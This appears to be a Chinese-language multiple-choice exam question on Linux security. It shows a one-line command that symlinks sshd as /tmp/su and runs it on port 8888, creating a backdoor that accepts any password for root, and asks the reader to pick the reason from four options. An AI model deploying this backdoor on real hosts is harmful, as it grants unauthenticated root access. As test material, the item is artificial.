【单选】执行：`ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=8888`，执行完之后，任何一台机器`ssh root@IP -p 8888`，输入任意密码，成功登录。 问：该后门为什么能够任意密码登陆？

A. sshd 不指定配置文件启动时，所有账号均可任意密码登陆   
B. sshd 因为被链接到/tmp目录，由于文件权限原因，可任意密码登陆   
C. sshd 因为被链接为/tmp/su，由于pam模块认证原因，可任意密码登陆   
D. sshd 因为被链接到/tmp目录，由于位置发生变化导致无法找到/etc/shadow文件因此放行登陆请求   
